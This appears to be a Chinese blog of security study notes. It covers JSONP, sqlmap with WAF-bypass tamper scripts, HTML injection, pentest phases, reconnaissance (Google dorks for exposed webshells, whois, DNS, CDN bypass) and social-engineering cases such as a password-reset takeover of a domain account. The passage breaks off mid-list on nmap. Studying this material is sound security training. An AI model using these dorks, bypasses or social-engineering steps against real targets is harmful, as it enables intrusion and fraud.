<p>可以看到，让我们点击按钮的时候，创建了一个script标签(即会发送一个get请求到src指向的地址,注意：这里必须使用scipt标签，否则返回的数据不会被当作js执行)，src地址是&quot;localhost:3000/article-list&quot;,这个src地址，就是我们请求的服务端接口。注意，这里我们有是那个参数，name,age和callback，name和age不说了，这跟我们平时普通的get请求参数无异。主要说下callback这个参数，callback参数就是核心所在。为什么要定义callback呢？首先我们知道，这个get请求已经被发出去了，那么我们如何接口请求回来的数据呢，callback=func则可以帮我们做这件事。我们继续看下边的代码</p>
<pre><code>&lt;button id=&quot;btn&quot;&gt;点击&lt;/button&gt;
&lt;script src=&quot;https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
$('#btn').click(function(){
var frame = document.createElement('script');
frame.src = 'http://localhost:3000/article-list?name=leo&amp;age=30&amp;callback=func';
$('body').append(frame);
});
    
function func(res){
alert(res.message+res.name+'你已经'+res.age+'岁了');
}
&lt;/script&gt;
</code></pre>
<p>这里可以看到，我们声明了一个func函数，但没有执行，你可以想一下，如果服务端接口到get请求，返回的是<code>func({message:'hello'})</code>，这样的话在服务端不就可以把数据通过函数执行传参的方式实现数据传递了吗。</p>
<p>服务端代码实现：<br>
接下来，我们看服务端应该如何实现：</p>
<pre><code>router.get('/article-list', (req, res) =&gt; {
console.log(req.query, '123');
let data = {
message: 'success!',
name: req.query.name,
age: req.query.age
}
data = JSON.stringify(data)
res.end('func(' + data + ')');
});
</code></pre>
<p>ok，接下来当我们点击提交的时候，就获取到了服务端反回的数据。如下：</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1625536769055.png" alt="" loading="lazy"><br>
这样下来，就完成了实现jsonp的跨域。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625536798447.png" alt="" loading="lazy"><br>
总结：<br>
需要注意的是，callback参数定义的方法是需要前后端定义好的，具体什么名字，商讨好就可以了。其实jsonp的整个过程就类似于前端声明好一个函数，后端返回执行函数。执行函数参数中携带所需的数据<br>
————————————————<br>
版权声明：本文为CSDN博主「机智的赵先生」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/badmoonc/article/details/82289252</p>
<h1 id="注入神器-sqlmap">注入神器 -SQLmap</h1>
<p>结合sqlmap 查询数据库：--dbs/--current-db 查询表：--tables/--tables-D 查询列：--dump-all/--dump-C-T-D<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625561849173.png" alt="" loading="lazy"><br>
<strong>tamper脚本</strong><br>
我们在下载好的SQLmap文件夹里可以找到文件夹tamper，其中该文件夹有44个脚本分别对57种WAF进行检测。例如360，绿盟WAF，modsecurity.，百度，fortiweb，cloudflare。由此可见老外对国内的WAF也是有了解的，可见他们也会悄悄对国内的WAF进行绕过。</p>
<p>其实一个简单的Tamper能够帮助我们修改Payload，修改请求头中的Header值，从而绕过IDS/WAF的检测。</p>
<p>这里的Payload就是指我们的每一个检测注入的SQL，在注入的时候我们可以加上-v 3参数来查看Payload。<br>
————————————————<br>
版权声明：本文为CSDN博主「是彻彻呀」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/Candyys/article/details/105892510<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625562721066.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625562724465.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625562728440.png" alt="" loading="lazy"></p>
<h1 id="html注入">HTML注入</h1>
<p>HTML注入有时也被称为虚拟污染。这实际是一个由站点造成的攻击，该站点允许恶意用户向其Web页面注入HTML，并且没有合理处理用户输入。换句话说，HTML注入漏洞是由网站接收HTML引起的，一般出现在网站页面的表单输入。</p>
<p>由于HTML是用于定义网页结构的语言，如果攻击者可以注入HTML，它们基本上可以改变浏览器呈现的内容。有时，这可能会导致页面外观的完全改变，或在其他情况下，创建表单来欺骗用户。例如，如果你可以注入HTML，你也许能够将&lt; form &gt;标签添加到页面，要求用户重新输入他们的用户名和密码。然而，当提交此表单时，它实际上将信息发送给了攻击者。<br>
————————————————<br>
版权声明：本文为CSDN博主「三体-二向箔」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_39157582/article/details/108157825</p>
<h1 id="2021-07-07">2021-07-07</h1>
<p><strong>渗透测试过程环节七大步</strong></p>
<p>前期交互阶段<br>
情报收集阶段<br>
威胁建模阶段<br>
漏洞分析阶段<br>
渗透攻击阶段<br>
后渗透攻击阶段POST<br>
报告阶段</p>
<p>前期交互阶段：与客户进行交互讨论，确定渗透测试范围，目标，限制条件以及服务合同等细节<br>
情报收集阶段：利用各种信息来源与搜索技术方法，尝试获取更多关于目标组织网络拓扑，系统配置与安全防御措施的信息<br>
威胁建模阶段：在收集到充分的信息进行威胁建模与攻击策划，确定出最可行的攻击通道<br>
漏洞分析阶段：找出可以渗透攻击的供给端，或者针对系统与服务进行安全漏洞探测与挖掘<br>
渗透攻击阶段：获取访问控制权<br>
后渗透攻击阶段：寻找客户组织最具价值和尝试安全保护的信息和资产，最终达成能够对客户组织造成最重要业务影响的攻击途径<br>
报告阶段：渗透测试的过程详细描述，以及修补与升级方案<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625697651721.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625697656559.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625697662431.png" alt="" loading="lazy"></p>
<p><strong>信息收集</strong></p>
<p>概念：黑客为了更加有效的实施攻击而在攻击前或攻击或成汇总对目标的所有探测活动<br>
目的：<br>
了解安全架构：信息收集使攻击者能够了解组织完整的安全架构<br>
缩小攻击范围：通过ip地址范围，网络，域名，元测化工你访问点等信息，可以缩小攻击范围<br>
建立信息数据库：攻击者能够建立他们自己的相关目标组织安全性弱点的信息数据库来采取下一次的入侵行动<br>
描绘网络拓扑：攻击者可以描绘出目标组织的网络拓扑图，分析最容易进入的攻击路径<br>
信息收集对于深渗透来说是非常重要的一步，手机的信息越详细对以后渗透测试的影响越大，毫不夸张地说，信息的收集决定着渗透的成功与否</p>
<p>分类：<br>
被动信息收集：被动信息收集也就是或不会与目标服务器做直接的交互，在不被目标系统察觉的情况下，通过搜索引擎，社交媒体等方式对目标外围的i西南西进行收集，例如网站的whois信息，DNS信息，管理员以及工作人员的个人信息等等<br>
主动信息收集：主动收集会与目标系统有直接的交互，从而得到目标系统相关的一些情报信息，例如：主机开发的端口，结构等等站点的目录</p>
<p>内容：<br>
网络信息：域名，内网域名，网段，授权可访问的IP地址，内部网络，开放的TCP、UDP端口，访问控制机制和ACL，运行的网络协议，VPN接入点，访问控制策略，运行的IDS监听策略模拟，数字段话号码认证机制，系统评估措施，防火墙等安全设施<br>
系统信息：用户和用户组名系统表示banner路由表，snmp信息，系统架构，远程系统类型，系统用户名，密码，站点目录，测试/临时文件<br>
组织信息：员工信息，组织网站，公司地址，位置详情，地址和电话号码，邮箱地址，HTML代码中的注释，实行的安全策略，与组织相关的web服务，组织的背景，发布的新闻</p>
<p>方法：<br>
搜索引擎，whois<br>
网站，DNS<br>
邮件，网络信息收集<br>
竞争情报，社会工程学<br>
Google，社交网站<br>
Google作为黑客工具，site指定域名，inurl：url中存在关键字的网页，intext：网页正文中的关键字，filetype：指定文件类型，intitle：网页标题中的关键字，link：baidu.com即表示返回所有和baidu.com做了来凝结的url，info：查找指定站点的一些基本信息，cache：搜索google里关于某些内容的缓存，site:edu.cn intext：后台管理<br>
intitle:&quot;php shell*&quot; &quot;Enable stderr&quot; filetype:php <br>
查找利用php webshell<br>
intitle—网页标题<br>
Enable stderr—UNIX标准输出和标准错误的缩写<br>
filetype—文件类型 <br>
intitle:intranet inurl:intranet+intext:”human resources”<br>
访问目标公司的私有网络和收集诸如员工列表、联系方式等敏感信息，这些是对于社会工程学来讲是非常有用的</p>
<p><strong>Shodan搜索引擎</strong></p>
<p>定义：是一个用于帮助发现主要的互联网系统漏洞（包括路由器，交换机工控系统等）的搜索引擎，它主要拦截从服务器到客户端的元数据来工作，目前提供查过50个端口的相关搜索</p>
<p>范围：服务器，路由器，交换机，公共ip的打印机，网络摄像头，加油站的泵，voip电话和所有数据采集监控系统</p>
<p>作用：用户搜索指定的项目，寻找端口并且拦截数据，为拦截的数据设置索引，显示结果</p>
<p>GOOGLE和SHODAN的区别：<br>
Google的爬虫、蜘蛛，抓取网页数据并且为网页内容创建索引，Shodan主要寻找端口并且抓取拦截到的信息，然后为他们建立索引，最后显示结果。shodan是一个基于拦截器的搜索引擎</p>
<h1 id="whois信息收集">whois信息收集</h1>
<p>whois（读作“Who is”，非缩写）是用来查询域名的IP以及所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令列接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令列接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。</p>
<p>可以获取：域名详细信息，域名所有者的联系方式，域名服务器，网络ip地址范围，域名创建时间，过期记录，最近更新记录</p>
<p>作用绘制详细的网络拓扑图，收集可以用来进行社会工程学的个人信息，收集其他内网信息</p>
<h1 id="dns常用资源记录类型">DNS常用资源记录类型</h1>
<p>常用的资源记录类型<br>
A 地址 此记录列出特定主机名的 IP 地址。这是名称解析的重要记录。<br>
CNAME 标准名称 此记录指定标准主机名的别名。<br>
MX邮件交换器此记录列出了负责接收发到域中的电子邮件的主机。<br>
NS名称服务器此记录指定负责给定区域的名称服务器。<br>
PTR将IP地址映射到主机名</p>
<h1 id="dns查询">DNS查询</h1>
<p>收集子域名信息的理由：直接从主域入手显然是很不明智的选择。因为它一般是重点防护区域，所以不如先进入目标的某个子域，再想办法迂回接近真正的目标！</p>
<p>用于子域名检测的工具主要有： Layer子域名挖掘机、K8、wydomain、Sublist3r、dnsmaper、subDomainsBrute等。还可以用搜索引擎枚举，例如要搜索百度旗下的子域名就可以使用：<br>
site:baidu.com<br>
也可以利用一些网站来查子域名信息：  https://dnsdumpster.com       https://crt.sh    https://censys.io    子域名爆破网站：  https://phpinfo.me/domain      ip反查绑定域名网站:    http://dns.aizhan.com</p>
<p><strong>了解nslookup:</strong><br>
Nslookup 是一个用来查询Internet域名服务器基础结构的信息的程序。<br>
Nslookup有两种模式：交互式和非交互式。<br>
交互模式容许用户查询域名服务器，获取各种关于主机和域名的信息或输出一个域内的主机列表。<br>
非交互模式用于只输出一个主机或域名的名字和要求的信息。<br>
使用前提：<br>
Nslookup 必须要安装了TCP/IP 协议的网络环境之后才能使用。</p>
<p><strong>dig</strong>（域信息搜索器）命令是一个在类Unix命令行模式下用于询问 DNS 域名服务器的灵活的工具。它执行 DNS 搜索，显示从受请求的域名服务器返回的答复。多数 DNS 管理员利用 dig 作为 DNS 问题的故障诊断，因为它灵活性好、易用、输出清晰。虽然通常情况下 dig 使用命令行参数，但它也可以按批处理模式从文件读取搜索请求。</p>
<p>网络信息收集 - 确定网络地址范围<br>
http://www.networksolutions.com/whois/index.jsp</p>
<p>确定网络地址范围的作用：</p>
<p>网络范围信息可以协助攻击者绘制目标网络的拓扑图<br>
使用ARIN whois database search工具找到IP地址的范围<br>
可以通过区域因特网注册机构找到IP地址范围和目标组织使用子网掩码</p>
<h1 id="netcraft确定网站操作系统">netcraft确定网站操作系统</h1>
<p>Netcraft公司于1994年底在英国成立，多年来一直致力于互联网市场以及在线安全方面的咨询服务，其中在国际上最具影响力的当属其针对网站服务器，域名解析/主机提供商，以及SSL市场所做的客观严谨的分析研究。——来自百度百科。当然这个不是今天要介绍的，今天要介绍的是Netcraft下面的一些功能。这些功能为我们查询指定域名的网站的一些信息，于了解一个网站的信息还是非常有帮助的。比如：，网站使用技术，安全信息，IP地址，DNS等一系列信息。当然，如果你愿意，还可以监控这个网站的performance。OS及历史变更<br>
　　查询网站的一些基本信息的使用的方式也非常的简单。进入Netcraft官网，找到What's that site running?在搜索框中输入你需要查找的域名，网站将返回所有关于该域名下的域名信息列表（含服务器信息），如果想了解指定域名下的详细信息，只需要在Site Report那栏点击即可了解非常详细的信息。<br>
http://uptime.netcraft.com/up/graph</p>
<h1 id="社会工程学信息收集">社会工程学信息收集</h1>
<p>通过社交工程企图收集：<br>
信用卡信息和社保号<br>
用户名和密码<br>
其他个人信息<br>
使用的安全性产品<br>
操作系统和软件版本<br>
网络布置信息<br>
IP地址和服务器名</p>
<p>社交工程师使用的技术：<br>
窃听：窃听就是未被允许的偷听对话或读取信息<br>
拦截通讯信息，比如音频、视频或书写文档<br>
肩窥：监听就是攻击者在后面偷窥用户已获取重要信息的过程<br>
攻击者获取如密码、身份证号、账户密码、信用卡信息等<br>
垃圾搜索：垃圾搜索就是从某人的垃圾箱中寻找有用信息<br>
它包括从目标公司垃圾箱、打印机垃圾箱、用户桌面上的备注中收集电话账单、通讯信息、金融信息、相关业务等信息。<br>
在社交网络中模仿他人</p>
<p>社会工程学（Social Engineering）：<br>
一种通过对受害者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱进行诸如欺骗、伤害等危害手段取得自身利益的手法，已成迅速上升甚至滥用的趋势。那么，什么算是社会工程学呢？<br>
它并不能等同于一般的欺骗手法，社会工程学尤其复杂，即使自认为最警惕最小心的人，一样会被高明的社会工程学手段损害利益。<br>
社会工程学陷阱就是通常以交谈、欺骗、假冒或口语等方式，从合法用户中套取用户系统的秘密。<br>
社会工程学是一种与普通的欺骗和诈骗不同层次的手法。</p>
<p>社工库：是用社会工程学进行攻击时积累的各方数据的结构化数据库。<br>
CASE1: 给目标公司的销售人员发送邮件，假装对某个产品很感兴趣，显然销售人员会回复邮件。这样攻击者就可以通过分析邮件头来收集这家公司的真实IP地址及内部电子邮件服务器的相关信息。<br>
CASE2: 假设现在已经收集到了目标人物的邮箱、QQ、电话号码、姓名、以及域名服务商，也通过爆破或者撞库的方法获取了邮箱的密码，这时就可以冒充目标人物要求客服人员协助重置域管理密码，甚至技术人员会帮着重置密码，从而使攻击者拿下域管理控制台，然后做域劫持！</p>
<p>#社交网站信息收集：<br>
社交网络SNS<br>
理论来源：六度理论</p>
<p>SNS：专指在帮助人们建立社会性网络的互联网应用服务。也指社会现有已成熟普及的信息载体，如短信SMS服务。SNS的另一种常用解释：全称Social Network Site，即“社交网站”或“社交网”。<br>
六度分割理论：<br>
你和任何一个陌生人之间所间隔的人不会超过六个，也就是说，最多通过五个中间人你就能够认识任何一个陌生人。<br>
20世纪60年代，美国心理学家米尔格兰姆设计了一个连锁信件实验。米尔格兰姆把信随机发送给住在美国各城市的一部分居民，信中写有一个波士顿股票经纪人的名字，并要求每名收信人把这封信寄给自己认为是比较接近这名股票经纪人的朋友。这位朋友收到信后，再把信寄给他认为更接近这名股票经纪人的朋友。最终，大部分信件都寄到了这名股票经纪人手中，每封信平均经手6．2次到达。<br>
于是，米尔格兰姆提出六度分割理论，认为世界上任意两个人之间建立联系，最多只需要6个人。</p>
<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1625701752228.png" alt="" loading="lazy"></figure>
<p>#其它一些重要的信息收集工具和方法</p>
<p>NMAP，如：收集目标主机的端口使用信息<br>
指纹识别<br>
查找WEB站点的真实IP<br>
收集敏感目录文件：DirBuster,kali中的OWASP ZAP, http://www.webscan.cc/<br>
真正的目标WEB服务器，CDN服务器，</p>
<p>针对网站目录的扫描工具主要有：DirBuster、御剑后台扫描珍藏版、wwwscan、Spinder.py、 Sensitivefilescan、 Weakfilescan等工具。</p>
<p>DirBuster是OWASP开发的一款基于JAVA编写的、专门用于探测WEB服务器的目录 和隐藏文件</p>
<p><strong>指纹识别</strong><br>
只有正确识别出WEB容器或网站CMS，才能查找与其相关的漏洞<br>
常见的CMS有：Dedecms(织梦)、Discuz、PHPWEB、PHPCMS、PHPWind、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等。<br>
识别CMS的代表工具有：御剑WEB指纹识别、WhatWeb、WebRobo、椰树、轻量WEB指纹识别等。<br>
除了这些工具，还可以利用一些在线网站来进行CMS指纹识别：<br>
http://whatweb.bugscaner.com/look/<br>
http://www.yunsee.cn/finger.html<br>
https://whatweb.net/<br>
CMS： 内容管理系统或者叫整站系统或者叫文章系统。在2004年之前，想完成网站内容管理，基本上都靠手工维护；</p>
<p><strong>查找WEB站点的真实IP</strong><br>
真正的目标WEB服务器：实际数据交互时还得找它。<br>
CDN服务器：缓存静态的数据资源<br>
1、判断目标是否使用了CDN；<br>
如果目标服务器没使用CDN，www.ip138.com<br>
通常会通过PING目标主域，观察域名的解析情况；还可以利用在线网站https://www.17ce.com<br>
2、绕过CDN寻找真实IP<br>
下边介绍一些常规的方法：<br>
内部邮箱源<br>
扫描网站测试文件<br>
分站域名<br>
国外访问：https://asm.ca.com/en/ping.php<br>
查询域名的解析记录  www.netcraft.com<br>
如果目标网站有自己的APP，可以尝试利用Fiddler或者Burp抓取APP的请求，从里边找到目标的真实IP<br>
3、验证获取到的IP<br>
最简单的验证方法是直接尝试用IP来访问此网站，看看打开的页面是不是和访问域名返回的内容一致！</p>
<p>资料参考：<br>
IP地址<br>
http://dns.aizhan.com/<br>
https://www.robtex.com<br>
https://asm.ca.com/en/ping.php<br>
http://who.is<br>
http://www.yougetsignal.com/tools/web-sites-on-web-server/<br>
http://toolbar.netcraft.com/site_report<br>
http://www.siteinfotool.com/</p>
<p>邮箱分析<br>
http://www.all-nettools.com/toolbox/email-dossier.php</p>
<p>CDN<br>
http://www.cdnplanet.com/tools/cdnfinder/</p>
<p>端口<br>
http://www.t1shopper.com/tools/port-scan/</p>
<p>综合<br>
https://www.zoomeye.org<br>
https://www.oshadan.com</p>
<p>使用Kali Linux在渗透测试中信息收集http://www.freebuf.com/articles/system/58096.html</p>
<p>利用metasploit进行信息收集<br>
http://www.freebuf.com/articles/network/33905.html</p>
<p>#2020-07-08</p>
<p>#漏洞扫描</p>
<p>分为：主动信息收集，主机信息扫描，漏洞扫描</p>
<p>主动信息收集：主动收集会与目标系统有直接的交互，从而得到目标系统相关的一些情报信息。例如：主机爱看i发的端口，服务，站点的目录结构等等<br>
网络扫描：是一种基于internet远程监测目标网络或本地主机安全性脆弱的技术<br>
枚举：攻击者主动探查一个网络，发现其中可以被利用有价值的信息</p>
<p>主动信息收集的内容：<br>
枚举的内容：<br>
NETBIOS枚举：小型局域网协议<br>
SNMP枚举：网络管理协议<br>
Unix/Linux枚举：<br>
LDAP枚举：目录访问协议<br>
NTP枚举：网络时间协议<br>
SMTP枚举：邮件服务协议<br>
DNS枚举：域名解析协议</p>
<p>#网络扫描<br>
根据对方服务所采取的协议，在一定时间内，通过自身系统对对方协议进行特定读取，猜想验证，恶意破坏，并且将对方直接或间接的返回数据作为某指标的判断依据的一种行为。<br>
网络安全扫描通过探测端口，服务，版本和这些服务及软件安全漏洞<br>
网络安全扫描技术也是采用积极的，非破坏性的办法来检验系统是否有可能被攻击奔溃<br>
利用一系列的脚本模拟对系统进行攻击的行为，并且对结果进行分析<br>
这种技术通常被用来进行攻击实验和安全审计<br>
网络安全扫描技术与防火墙，安全监控系统互相配合就能够为网络提供很高的安全性</p>
<p>特点：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625740619180.png" alt="" loading="lazy"><br>
网络扫描获取的信息<br>
发现存活主句，ip地址，以及存活主机开放的端口<br>
发现主机操作系统类型和系统结构<br>
发现主机开启的服务类型<br>
发现主机存在的漏洞</p>
<figure data-type="image" tabindex="2"><img src="https://jinqipiaopiao.github.io//post-images/1625741473738.png" alt="" loading="lazy"></figure>
<p>预备代理（扫描之间要使用代理）<br>
直接与目标系统交互通信<br>
无法避免留下访问的痕迹<br>
所以要做好被封杀的准备</p>
<h1 id="代理服务器">代理服务器</h1>
<p>功能是代理网络用户取得网络信息<br>
形象的说：他是网络信息的中转站，代理服务器就好像一个大的cache这样救恩那个显著提高浏览速度和效率，更重要的是：Proxy Server（代理服务器）是internet链路级网关所提供的一种重要的安全功能<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625742790643.png" alt="" loading="lazy"></p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1625743180435.png" alt="" loading="lazy"><br>
1.突破自身IP访问限制，访问国外站点，教育网、google等<br>
2.访问单位或团体内部资源，使用教育网内地址段免费代理服务器，就可以用于对教育网开放的各类FTP下载上传，以及各类资料查询共享<br>
3.突破中国电信的IP封锁：中国电信用户有很多网站是被限制访问的，这种限制是人为的，不同Serve对地址的封锁是不同的。<br>
4.提高访问速度：通常代理服务器都设置一个较大的硬盘缓冲区，当有外界的信息通过时，同时也将其保存到缓冲区中，当其他用户再访问相同的信息时， 则直接由缓冲区中取出信息，传给用户，以提高访问速度。<br>
5.隐藏真实IP：上网者也可以通过这种方法隐藏自己的IP，免受攻击。</p>
<p>几种常见的代理</p>
<p>Http代理：<br>
www对于每一个上网的人都再熟悉不过了，www连接请求就是采用的http协议，所以我们在浏览网页，下载数据（也可采用ftp协议）时就是用http代理，他用长绑定在代理服务器的80，3128，8080端口上</p>
<p>Socks代理：<br>
采用socks协议的代理服务器jiushisocks服务器，是一种通用的代理服务器<br>
使用socks需要了解：1.socks服务器的IP地址 2.socks服务所在的端口 3.这个socks服务是否需要用户认证？如果需要，您要向您的网络管理员申请一个用户和命令<br>
应用：各种网游加速器</p>
<p>Vpn代理<br>
公用网络上建立专用网络的技术。整个vpn网络的任意两个结点架构在公用网络服务商isp所提供的网络平台之上的逻辑网络，用户的数据是通过公共网络中建立的逻辑隧道即点导电的虚拟专线进行传输的，通过相应的加密和认证技术来保证用户内部网络书据在公网上安全传输，从而真正实现网络数据的专有性。</p>
<p>备注：HTTP代理<br>
www对于每一个上网的人都再熟悉不过了，www连接请求就是采用的http协议，所以我们在浏览网页，下载数据（也可采用ftp协议）时就是用http代理。它通常绑定在代理服务器的80、3128、8080等端口上。<br>
socks代理<br>
采用socks协议的代理服务器就是SOCKS服务器，是一种通用的代理服务器。Socks是个电路级的底层网关，是DavidKoblas在1990年开发的，此后就一直作为Internet RFC标准的开放标准。Socks 不要求应用程序遵循特定的操作系统平台，Socks 代理与应用层代理、HTTP层代理不同，Socks 代理只是简单地传递数据包，而不必关心是何种应用协议（比如FTP、HTTP和NNTP请求）。所以，Socks代理比其他应用层代理要快得多。它通常绑定在代理服务器的1080端口上。如果您在企业网或校园网上，需要透过防火墙或通过代理服务器访问 Internet就可能需要使用SOCKS。一般情况下，对于拨号上网用户都不需要使用它。注意，浏览网页时常用的代理服务器通常是专门的http代理，它和SOCKS是不同的。因此，您能浏览网页不等于 您一定可以通过SOCKS访问Internet。常用的防火墙，或代理软件都支持SOCKS，但需要其管理员打开这一功能。如果您不确信您是否需要SOCKS或是否有SOCKS可用，请与您的网络管理员联系。使用socks，需要了解一下内容：<br>
① SOCKS服务器的IP地址<br>
② SOCKS服务所在的端口<br>
③ 这个SOCKS服务是否需要用户认证？如果需要，您要向您的网络管理员申请一个用户和口令<br>
知道了上述信息，您就可以把这些信息填入“网络配置”中，或者在第一次登记时填入，您就可以使用socks代理了。[1] <br>
在实际应用中SOCKS代理可以用作为：电子邮件、新闻组软件、网络传呼ICQ、网络聊天MIRC和使用代理服务器上联众打游戏等等各种游戏应用软件当中。[1] <br>
VPN代理<br>
指在共用网络上建立专用网络的技术。之所以称为虚拟网主要是因为整个VPN网络的任意两个结点之间的连接并没有传统专网建设所需的点到点的物理链路，而是架构在公用网络服务商ISP所提供的网络平台之上的逻辑网络。用户的数据是通过ISP在公共网络（Internet）中建立的逻辑隧道（Tunnel），即点到点的虚拟专线进行传输的。通过相应的加密和认证技术来保证用户内部网络数据在公网上安全传输，从而真正实现网络数据的专有性。</p>
<p>攻击者可以通过使用代理服务器可以？<br>
隐藏源地址，所以攻击可以在无任何法律论据的情况下入侵；<br>
通过冒充一个代理的源地址来掩盖实际的攻击地址；<br>
远程访问内网和其他通常禁止访问的网页资源；<br>
拦截所有攻击者发送的请求并且将其他们转换为第三个目标，因此受害者这将只能识别代理服务器的地址；<br>
攻击者将多个代理服务器连接起来以避免被探测到</p>
<h1 id="主机信息扫描">主机信息扫描</h1>
<p>判断存活主机<br>
ping扫描值得是向主机发送ICMP ECHO请求报文。如果主机是活动的，他将返回一个ICMP ECHO应答<br>
（PING：是DOS命令，一般用于检测网络通与不通，也叫时延，其值越大，速度越慢。PIING，因特网包探索器，用于测试网络连接量的程序，Ping发送一个ICMP(Internet Contron Messages Protocol);因特网信报控制协议）回声请求消息给目的地并且报告是否收到所希望的ICMP回声应答<br>
它是用来检查网络是否通畅或者网络连接速度的命令。作为一个生活在网络上的管理员或者黑客来说，ping命令是一个必须掌握的DOS命令，她所利用的原理是这样的；利用网络上机器IP地址的唯一性，给目标IP地址发送一个数据包，再要求对方返回一个同样大小的数据包来确定两台网络机器是否连接相通，时延是多少</p>
<p>ping说明<br>
指定包个数<br>
Ping -n 2 200.200.0.20</p>
<p>不间断发送ping包<br>
Ping -t 200.200.0.20</p>
<p>指定ping包字节大小<br>
Ping -l 1000 200.200.0.20</p>
<figure data-type="image" tabindex="3"><img src="https://jinqipiaopiao.github.io//post-images/1625791128315.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://jinqipiaopiao.github.io//post-images/1625791289444.png" alt="" loading="lazy"></figure>
<p>ICMP的回送请求和应答报文通常是用来检查网路连通性，对于大多数系统而言，发送ICMP echo request 报文的命令是ping，由于ip数据包的最大长度为65535字节，而icmp报文位于数据报头之后，并与IP数据包封装在一起，因此icmp数据包最大尺寸不超过65515字节利用这一规定，可以向主句发动ping of death 攻击。 ping of death 攻击 是通过在最后分段中，改变其正确的偏移量和段长度的组合，使系统再接收到全部分段并重组报文时总的长度超过了65535字节，导致内粗哪一出，这时主机就会出现内存分配错误而导致TCP/IP堆栈奔溃导致死机</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1625791941578.png" alt="" loading="lazy"><br>
PING扫射<br>
同时扫描大量的ip地址段，以发现某个ip地址是否绑定活跃主机的扫描</p>
<p>批量主机存活发现原理<br>
客户端对二秘阁IP地址做出ICMP echo request 请求<br>
存活的主机对请求做出ICMP echo reply 回应<br>
不存活主机不做任何回应<br>
服务端完成统计<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625791948248.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625791952113.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625791955705.png" alt="" loading="lazy"></p>
<p>端口扫描---端口和服务<br>
什么是服务：<br>
“服务”是指某主机按预先定义的协议和一些国际标准，行业标准，向其他主机提供某种数据的支持，并且称服务提供者为“服务器”（Server），称服务请求者为“客户端”（Client）</p>
<p><strong>端口和服务的关系</strong><br>
一台主机可安装多个服务，这些服务可以是相同的服务，也可以是不同的服务，为了区分这些服务，引入端口（“port”）这个概念，即每一个服务对应于一个或者多个端口，端口具有独占性，一旦有服务占用了某个端口，则通常情况下，另外的服务不能再占用这个端口</p>
<p>端口：是传输层协议为了识别统一主机上不同应用程序进程而引入的一个概念</p>
<p><strong>端口的管理和分配</strong><br>
端口有应用程序申请，操作系统统一管理和分配<br>
一个应用程序会占用一个或者多个端口</p>
<p>端口分类：<br>
公认端口：<br>
0-1023的端口是公认的，知名的</p>
<p>0-255之间的端口由英特网名称与数字地址分配机构（ICANN）</p>
<p>注册端口：<br>
注册端口主要用于服务器对外提供服务<br>
端口范围：1024-49151</p>
<p>动态/私有端口<br>
用于分配给用户编写的客户端应用程序<br>
端口范围：49152-65535</p>
<p><strong>常见知名端口：</strong><br>
UDP端口：<br>
161-SNMP，53-DNS，69-TFTP，111-RPC<br>
TCP端口：<br>
21-FTP，23-Telnet，25-SMTP，80-HTTP</p>
<p>端口		应用层协议		说明<br>
53		DNS			域名服务器<br>
69		TFTP			简单文件传输协议<br>
111		RPC			远程过程调用<br>
161     SNMP			简单网络管理协议</p>
<p>端口		应用层协议		说明<br>
20		FTP			文件传输协议（数据连接）<br>
21		FTP			文件传输协议（控制连接）<br>
23		Telnet			远程登录协议<br>
25		SMTP			简单文件传输协议<br>
80		HTTP			超文本传输协议<br>
110		POP3			邮局协议</p>
<p><strong>端口扫描的原理</strong><br>
原理：<br>
端口扫描是向目标主机的TCP或UDP端口发送探测数据包，随后记录目标主机的响应。通过分析目标主机的响应来判断服务端口是打开还是关闭，据此推测目标主机端口提供的服务或信息</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1625799863444.png" alt="" loading="lazy"><br>
Tcp客户端<br>
对端口建立连接，记录远端服务器应答，查询记录获取目标服务器所安装的服务名称<br>
Udp客户端<br>
对端口建立连接，记录远端服务器应答，查询记录获取目标服务器所安装的服务名称</p>
<p><strong>端口扫描-nmap</strong><br>
定义：是由Gordon Loyon设计，用来探测计算机网络上的主机和服务的一种安全扫描器，为了绘制网络拓扑图，nmap的发送特制的数据包到目标主机，然后对返回数据包进行分析，nmap是一款枚举和测试网络的强大工具<br>
Nmap是目前业界最为知名、最为强大的端口扫描器。Nmap在安全领域内非常流行，像渗透工具Metasploit、漏洞扫描工具openVAS等工具都内置了Nmap，而漏洞扫描工具Nessus也支持导入Nmap扫描结果。<br>
Nmap是主要用于基本的信息的搜集，包括主机活动状态、主机端口开放状况、应用服务及版本、操作系统与设备类型等等。</p>
<p>作用：<br>
主机探测：探测网络上的主机<br>
